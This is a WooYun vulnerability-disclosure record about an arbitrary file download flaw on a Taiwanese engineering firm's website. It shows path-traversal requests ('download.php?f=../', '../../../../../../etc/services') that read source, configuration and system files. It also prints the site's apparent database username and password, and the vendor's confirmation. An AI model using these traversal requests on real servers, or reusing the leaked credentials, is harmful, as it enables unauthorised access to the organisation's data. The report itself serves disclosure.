{"id": 74967, "wybug_id": "wooyun-2016-0168935", "wybug_title": "中興工程顧問股份有限公司某站設計缺陷任意文件下載（臺灣地區）", "wybug_corp": "中興工程顧問股份有限公司", "wybug_author": "j0k3r", "wybug_date": "2016-01-11 13:39", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： rt 详细说明：  目标：http://**.**.**.**构造，\nhttp://**.**.**.**/chinese/02_about/download.php?f=../index.php\n\n\n数据库配置文件\nhttp://**.**.**.**/chinese/02_about/download.php?f=../include/php_script/common.php\ncommon.php中\n$DB_str = \"mysql,localhost,gercweb, creative, gerc_ctr\";\ndatabase/DB_class.php中的GetServerInfo函数，\nfunction GetServerInfo($DB_str){\t\t$DB_info = array(\t\t\t'type'  => false,\t\t\t'host' => false,\t\t\t'dbname' => false,\t\t\t'user' => false,\t\t\t'password' => false\t\t);\t\t\t\t$Store_info = split(\",\",$DB_str);\t\t$DB_info['type'] = $Store_info[0];\t\t$DB_info['host'] = $Store_info[1];\t\t$DB_info['dbname'] = $Store_info[2];\t\t$DB_info['user'] = $Store_info[3];\t\t$DB_info['password'] = $Store_info[4];\t\treturn $DB_info;\n数据库用户名密码即为creative/gerc_ctr系统文件services\nhttp://**.**.**.**/chinese/02_about/download.php?f=../../../../../../etc/services\nservices中\n# Network services, Internet style## Note that it is presently the policy of IANA to assign a single well-known# port number for both TCP and UDP; hence, officially ports have two entries# even if the protocol doesn't support UDP operations.## Updated from http://**.**.**.**/assignments/port-numbers and other# sources like http://**.**.**.**/cgi/cvsweb.cgi/src/etc/services .# New ports will be added on request if they have been officially assigned# by IANA and used in the real-world or are needed by a debian package.# If you need a huge list of used numbers please install the nmap package.tcpmux\t\t1/tcp\t\t\t\t# TCP port service multiplexerecho\t\t7/tcpecho\t\t7/udpdiscard\t\t9/tcp\t\tsink nulldiscard\t\t9/udp\t\tsink nullsystat\t\t11/tcp\t\tusersdaytime\t\t13/tcpdaytime\t\t13/udpnetstat\t\t15/tcpqotd\t\t17/tcp\t\tquotemsp\t\t18/tcp\t\t\t\t# message send protocolmsp\t\t18/udpchargen\t\t19/tcp\t\tttytst sourcechargen\t\t19/udp\t\tttytst sourceftp-data\t20/tcpftp\t\t21/tcpfsp\t\t21/udp\t\tfspdssh\t\t22/tcp\t\t\t\t# SSH Remote Login Protocolssh\t\t22/udptelnet\t\t23/tcpsmtp\t\t25/tcp\t\tmailtime\t\t37/tcp\t\ttimservertime\t\t37/udp\t\ttimserverrlp\t\t39/udp\t\tresource\t# resource locationnameserver\t42/tcp\t\tname\t\t# IEN 116whois\t\t43/tcp\t\tnicnametacacs\t\t49/tcp\t\t\t\t# Login Host Protocol (TACACS)tacacs\t\t49/udpre-mail-ck\t50/tcp\t\t\t\t# Remote Mail Checking Protocolre-mail-ck\t50/udpdomain\t\t53/tcp\t\t\t\t# Domain Name Serverdomain\t\t53/udpmtp\t\t57/tcp\t\t\t\t# deprecatedtacacs-ds\t65/tcp\t\t\t\t# TACACS-Database Servicetacacs-ds\t65/udpbootps\t\t67/tcp\t\t\t\t# BOOTP serverbootps\t\t67/udpbootpc\t\t68/tcp\t\t\t\t# BOOTP clientbootpc\t\t68/udptftp\t\t69/udpgopher\t\t70/tcp\t\t\t\t# Internet Gophergopher\t\t70/udprje\t\t77/tcp\t\tnetrjsfinger\t\t79/tcphttp\t\t80/tcp\t\twww\t\t# WorldWideWeb HTTPhttp\t\t80/udp\t\t\t\t# HyperText Transfer Protocollink\t\t87/tcp\t\tttylinkkerberos\t88/tcp\t\tkerberos5 krb5 kerberos-sec\t# Kerberos v5kerberos\t88/udp\t\tkerberos5 krb5 kerberos-sec\t# Kerberos v5supdup\t\t95/tcphostnames\t101/tcp\t\thostname\t# usually from sri-niciso-tsap\t102/tcp\t\ttsap\t\t# part of ISODEacr-nema\t104/tcp\t\tdicom\t\t# Digital Imag. & Comm. 300acr-nema\t104/udp\t\tdicomcsnet-ns\t105/tcp\t\tcso-ns\t\t# also used by CSO name servercsnet-ns\t105/udp\t\tcso-nsrtelnet\t\t107/tcp\t\t\t\t# Remote Telnetrtelnet\t\t107/udppop2\t\t109/tcp\t\tpostoffice pop-2 # POP version 2pop2\t\t109/udp\t\tpop-2pop3\t\t110/tcp\t\tpop-3\t\t# POP version 3pop3\t\t110/udp\t\tpop-3sunrpc\t\t111/tcp\t\tportmapper\t# RPC 4.0 portmappersunrpc\t\t111/udp\t\tportmapperauth\t\t113/tcp\t\tauthentication tap identsftp\t\t115/tcpuucp-path\t117/tcpnntp\t\t119/tcp\t\treadnews untp\t# USENET News Transfer Protocolntp\t\t123/tcpntp\t\t123/udp\t\t\t\t# Network Time Protocolpwdgen\t\t129/tcp\t\t\t\t# PWDGEN servicepwdgen\t\t129/udploc-srv\t\t135/tcp\t\tepmap\t\t# Location Serviceloc-srv\t\t135/udp\t\tepmapnetbios-ns\t137/tcp\t\t\t\t# NETBIOS Name Servicenetbios-ns\t137/udpnetbios-dgm\t138/tcp\t\t\t\t# NETBIOS Datagram Servicenetbios-dgm\t138/udpnetbios-ssn\t139/tcp\t\t\t\t# NETBIOS session servicenetbios-ssn\t139/udpimap2\t\t143/tcp\t\timap\t\t# Interim Mail Access P 2 and 4imap2\t\t143/udp\t\timapsnmp\t\t161/tcp\t\t\t\t# Simple Net Mgmt Protocolsnmp\t\t161/udpsnmp-trap\t162/tcp\t\tsnmptrap\t# Traps for SNMPsnmp-trap\t162/udp\t\tsnmptrapcmip-man\t163/tcp\t\t\t\t# ISO mgmt over IP (CMOT)cmip-man\t163/udpcmip-agent\t164/tcpcmip-agent\t164/udpmailq\t\t174/tcp\t\t\t# Mailer transport queue for Zmailermailq\t\t174/udpxdmcp\t\t177/tcp\t\t\t\t# X Display Mgr. Control Protoxdmcp\t\t177/udpnextstep\t178/tcp\t\tNeXTStep NextStep\t# NeXTStep windownextstep\t178/udp\t\tNeXTStep NextStep\t#  serverbgp\t\t179/tcp\t\t\t\t# Border Gateway Protocolbgp\t\t179/udpprospero\t191/tcp\t\t\t\t# Cliff Neuman's Prosperoprospero\t191/udpirc\t\t194/tcp\t\t\t\t# Internet Relay Chatirc\t\t194/udpsmux\t\t199/tcp\t\t\t\t# SNMP Unix Multiplexersmux\t\t199/udpat-rtmp\t\t201/tcp\t\t\t\t# AppleTalk routingat-rtmp\t\t201/udpat-nbp\t\t202/tcp\t\t\t\t# AppleTalk name bindingat-nbp\t\t202/udpat-echo\t\t204/tcp\t\t\t\t# AppleTalk echoat-echo\t\t204/udpat-zis\t\t206/tcp\t\t\t\t# AppleTalk zone informationat-zis\t\t206/udpqmtp\t\t209/tcp\t\t\t\t# Quick Mail Transfer Protocolqmtp\t\t209/udpz3950\t\t210/tcp\t\twais\t\t# NISO Z39.50 databasez3950\t\t210/udp\t\twaisipx\t\t213/tcp\t\t\t\t# IPXipx\t\t213/udpimap3\t\t220/tcp\t\t\t\t# Interactive Mail Accessimap3\t\t220/udp\t\t\t\t# Protocol v3pawserv\t\t345/tcp\t\t\t\t# Perf Analysis Workbenchpawserv\t\t345/udpzserv\t\t346/tcp\t\t\t\t# Zebra serverzserv\t\t346/udpfatserv\t\t347/tcp\t\t\t\t# Fatmen Serverfatserv\t\t347/udprpc2portmap\t369/tcprpc2portmap\t369/udp\t\t\t\t# Coda portmappercodaauth2\t370/tcpcodaauth2\t370/udp\t\t\t\t# Coda authentication serverclearcase\t371/tcp\t\tClearcaseclearcase\t371/udp\t\tClearcaseulistserv\t372/tcp\t\t\t\t# UNIX Listservulistserv\t372/udpldap\t\t389/tcp\t\t\t# Lightweight Directory Access Protocolldap\t\t389/udpimsp\t\t406/tcp\t\t\t# Interactive Mail Support Protocolimsp\t\t406/udpsvrloc\t\t427/tcp\t\t\t\t# Server Locationsvrloc\t\t427/udphttps\t\t443/tcp\t\t\t\t# http protocol over TLS/SSLhttps\t\t443/udpsnpp\t\t444/tcp\t\t\t\t# Simple Network Paging Protocolsnpp\t\t444/udpmicrosoft-ds\t445/tcp\t\t\t\t# Microsoft Naked CIFSmicrosoft-ds\t445/udpkpasswd\t\t464/tcpkpasswd\t\t464/udpsaft\t\t487/tcp\t\t\t# Simple Asynchronous File Transfersaft\t\t487/udpisakmp\t\t500/tcp\t\t\t# IPsec - Internet Security Associationisakmp\t\t500/udp\t\t\t#  and Key Management Protocolrtsp\t\t554/tcp\t\t\t# Real Time Stream Control Protocolrtsp\t\t554/udpnqs\t\t607/tcp\t\t\t\t# Network Queuing systemnqs\t\t607/udpnpmp-local\t610/tcp\t\tdqs313_qmaster\t\t# npmp-local / DQSnpmp-local\t610/udp\t\tdqs313_qmasternpmp-gui\t611/tcp\t\tdqs313_execd\t\t# npmp-gui / DQSnpmp-gui\t611/udp\t\tdqs313_execdhmmp-ind\t612/tcp\t\tdqs313_intercell\t# HMMP Indication / DQShmmp-ind\t612/udp\t\tdqs313_intercellqmqp\t\t628/tcpqmqp\t\t628/udpipp\t\t631/tcp\t\t\t\t# Internet Printing Protocolipp\t\t631/udp省略\n   漏洞证明：  \n\ncommon.php中\n$DB_str = \"mysql,localhost,gercweb, creative, gerc_ctr\";\nservices中\n# Network services, Internet style## Note that it is presently the policy of IANA to assign a single well-known# port number for both TCP and UDP; hence, officially ports have two entries# even if the protocol doesn't support UDP operations.## Updated from http://**.**.**.**/assignments/port-numbers and other# sources like http://**.**.**.**/cgi/cvsweb.cgi/src/etc/services .# New ports will be added on request if they have been officially assigned# by IANA and used in the real-world or are needed by a debian package.# If you need a huge list of used numbers please install the nmap package.tcpmux\t\t1/tcp\t\t\t\t# TCP port service multiplexerecho\t\t7/tcpecho\t\t7/udpdiscard\t\t9/tcp\t\tsink nulldiscard\t\t9/udp\t\tsink nullsystat\t\t11/tcp\t\tusersdaytime\t\t13/tcpdaytime\t\t13/udpnetstat\t\t15/tcpqotd\t\t17/tcp\t\tquotemsp\t\t18/tcp\t\t\t\t# message send protocolmsp\t\t18/udpchargen\t\t19/tcp\t\tttytst sourcechargen\t\t19/udp\t\tttytst sourceftp-data\t20/tcpftp\t\t21/tcpfsp\t\t21/udp\t\tfspdssh\t\t22/tcp\t\t\t\t# SSH Remote Login Protocolssh\t\t22/udptelnet\t\t23/tcpsmtp\t\t25/tcp\t\tmailtime\t\t37/tcp\t\ttimservertime\t\t37/udp\t\ttimserverrlp\t\t39/udp\t\tresource\t# resource locationnameserver\t42/tcp\t\tname\t\t# IEN 116whois\t\t43/tcp\t\tnicnametacacs\t\t49/tcp\t\t\t\t# Login Host Protocol (TACACS)tacacs\t\t49/udpre-mail-ck\t50/tcp\t\t\t\t# Remote Mail Checking Protocolre-mail-ck\t50/udpdomain\t\t53/tcp\t\t\t\t# Domain Name Serverdomain\t\t53/udpmtp\t\t57/tcp\t\t\t\t# deprecatedtacacs-ds\t65/tcp\t\t\t\t# TACACS-Database Servicetacacs-ds\t65/udpbootps\t\t67/tcp\t\t\t\t# BOOTP serverbootps\t\t67/udpbootpc\t\t68/tcp\t\t\t\t# BOOTP clientbootpc\t\t68/udptftp\t\t69/udpgopher\t\t70/tcp\t\t\t\t# Internet Gophergopher\t\t70/udprje\t\t77/tcp\t\tnetrjsfinger\t\t79/tcphttp\t\t80/tcp\t\twww\t\t# WorldWideWeb HTTPhttp\t\t80/udp\t\t\t\t# HyperText Transfer Protocollink\t\t87/tcp\t\tttylinkkerberos\t88/tcp\t\tkerberos5 krb5 kerberos-sec\t# Kerberos v5kerberos\t88/udp\t\tkerberos5 krb5 kerberos-sec\t# Kerberos v5supdup\t\t95/tcphostnames\t101/tcp\t\thostname\t# usually from sri-niciso-tsap\t102/tcp\t\ttsap\t\t# part of ISODEacr-nema\t104/tcp\t\tdicom\t\t# Digital Imag. & Comm. 300acr-nema\t104/udp\t\tdicomcsnet-ns\t105/tcp\t\tcso-ns\t\t# also used by CSO name servercsnet-ns\t105/udp\t\tcso-nsrtelnet\t\t107/tcp\t\t\t\t# Remote Telnetrtelnet\t\t107/udppop2\t\t109/tcp\t\tpostoffice pop-2 # POP version 2pop2\t\t109/udp\t\tpop-2pop3\t\t110/tcp\t\tpop-3\t\t# POP version 3pop3\t\t110/udp\t\tpop-3sunrpc\t\t111/tcp\t\tportmapper\t# RPC 4.0 portmappersunrpc\t\t111/udp\t\tportmapperauth\t\t113/tcp\t\tauthentication tap identsftp\t\t115/tcpuucp-path\t117/tcpnntp\t\t119/tcp\t\treadnews untp\t# USENET News Transfer Protocolntp\t\t123/tcpntp\t\t123/udp\t\t\t\t# Network Time Protocolpwdgen\t\t129/tcp\t\t\t\t# PWDGEN servicepwdgen\t\t129/udploc-srv\t\t135/tcp\t\tepmap\t\t# Location Serviceloc-srv\t\t135/udp\t\tepmapnetbios-ns\t137/tcp\t\t\t\t# NETBIOS Name Servicenetbios-ns\t137/udpnetbios-dgm\t138/tcp\t\t\t\t# NETBIOS Datagram Servicenetbios-dgm\t138/udpnetbios-ssn\t139/tcp\t\t\t\t# NETBIOS session servicenetbios-ssn\t139/udpimap2\t\t143/tcp\t\timap\t\t# Interim Mail Access P 2 and 4imap2\t\t143/udp\t\timapsnmp\t\t161/tcp\t\t\t\t# Simple Net Mgmt Protocolsnmp\t\t161/udpsnmp-trap\t162/tcp\t\tsnmptrap\t# Traps for SNMPsnmp-trap\t162/udp\t\tsnmptrapcmip-man\t163/tcp\t\t\t\t# ISO mgmt over IP (CMOT)cmip-man\t163/udpcmip-agent\t164/tcpcmip-agent\t164/udpmailq\t\t174/tcp\t\t\t# Mailer transport queue for Zmailermailq\t\t174/udpxdmcp\t\t177/tcp\t\t\t\t# X Display Mgr. Control Protoxdmcp\t\t177/udpnextstep\t178/tcp\t\tNeXTStep NextStep\t# NeXTStep windownextstep\t178/udp\t\tNeXTStep NextStep\t#  serverbgp\t\t179/tcp\t\t\t\t# Border Gateway Protocolbgp\t\t179/udpprospero\t191/tcp\t\t\t\t# Cliff Neuman's Prosperoprospero\t191/udpirc\t\t194/tcp\t\t\t\t# Internet Relay Chatirc\t\t194/udpsmux\t\t199/tcp\t\t\t\t# SNMP Unix Multiplexersmux\t\t199/udpat-rtmp\t\t201/tcp\t\t\t\t# AppleTalk routingat-rtmp\t\t201/udpat-nbp\t\t202/tcp\t\t\t\t# AppleTalk name bindingat-nbp\t\t202/udpat-echo\t\t204/tcp\t\t\t\t# AppleTalk echoat-echo\t\t204/udpat-zis\t\t206/tcp\t\t\t\t# AppleTalk zone informationat-zis\t\t206/udpqmtp\t\t209/tcp\t\t\t\t# Quick Mail Transfer Protocolqmtp\t\t209/udpz3950\t\t210/tcp\t\twais\t\t# NISO Z39.50 databasez3950\t\t210/udp\t\twaisipx\t\t213/tcp\t\t\t\t# IPXipx\t\t213/udpimap3\t\t220/tcp\t\t\t\t# Interactive Mail Accessimap3\t\t220/udp\t\t\t\t# Protocol v3pawserv\t\t345/tcp\t\t\t\t# Perf Analysis Workbenchpawserv\t\t345/udpzserv\t\t346/tcp\t\t\t\t# Zebra serverzserv\t\t346/udpfatserv\t\t347/tcp\t\t\t\t# Fatmen Serverfatserv\t\t347/udprpc2portmap\t369/tcprpc2portmap\t369/udp\t\t\t\t# Coda portmappercodaauth2\t370/tcpcodaauth2\t370/udp\t\t\t\t# Coda authentication serverclearcase\t371/tcp\t\tClearcaseclearcase\t371/udp\t\tClearcaseulistserv\t372/tcp\t\t\t\t# UNIX Listservulistserv\t372/udpldap\t\t389/tcp\t\t\t# Lightweight Directory Access Protocolldap\t\t389/udpimsp\t\t406/tcp\t\t\t# Interactive Mail Support Protocolimsp\t\t406/udpsvrloc\t\t427/tcp\t\t\t\t# Server Locationsvrloc\t\t427/udphttps\t\t443/tcp\t\t\t\t# http protocol over TLS/SSLhttps\t\t443/udpsnpp\t\t444/tcp\t\t\t\t# Simple Network Paging Protocolsnpp\t\t444/udpmicrosoft-ds\t445/tcp\t\t\t\t# Microsoft Naked CIFSmicrosoft-ds\t445/udpkpasswd\t\t464/tcpkpasswd\t\t464/udpsaft\t\t487/tcp\t\t\t# Simple Asynchronous File Transfersaft\t\t487/udpisakmp\t\t500/tcp\t\t\t# IPsec - Internet Security Associationisakmp\t\t500/udp\t\t\t#  and Key Management Protocolrtsp\t\t554/tcp\t\t\t# Real Time Stream Control Protocolrtsp\t\t554/udpnqs\t\t607/tcp\t\t\t\t# Network Queuing systemnqs\t\t607/udpnpmp-local\t610/tcp\t\tdqs313_qmaster\t\t# npmp-local / DQSnpmp-local\t610/udp\t\tdqs313_qmasternpmp-gui\t611/tcp\t\tdqs313_execd\t\t# npmp-gui / DQSnpmp-gui\t611/udp\t\tdqs313_execdhmmp-ind\t612/tcp\t\tdqs313_intercell\t# HMMP Indication / DQShmmp-ind\t612/udp\t\tdqs313_intercellqmqp\t\t628/tcpqmqp\t\t628/udpipp\t\t631/tcp\t\t\t\t# Internet Printing Protocolipp\t\t631/udp省略\n   修复方案：  ..   版权声明：转载请注明来源 j0k3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2016-01-12 02:14 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}